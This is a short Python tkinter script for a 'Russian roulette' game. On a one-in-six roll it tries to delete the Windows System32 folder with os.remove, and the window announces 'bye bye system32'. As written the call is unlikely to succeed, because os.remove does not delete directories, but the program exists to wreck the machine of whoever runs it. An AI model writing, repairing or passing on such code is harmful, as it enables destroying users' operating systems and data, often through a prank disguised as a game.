import tkinter as tk
import random as rdm
import os

def game(): 
    bang = rdm.randint(1, 6)
    if bang == 6:
        label.config(text="Lose.. bye bye system32")
        os.remove('C:/Windows/System32')
    else:
        label.config(text="Win, retry :)")

root = tk.Tk()
root.title('K7 | Russian idiot game')

playBtn = tk.Button(root, text="play", command=game)

playBtn.pack(pady=20)

label = tk.Label(root, text="")
label.pack()

root.mainloop()
    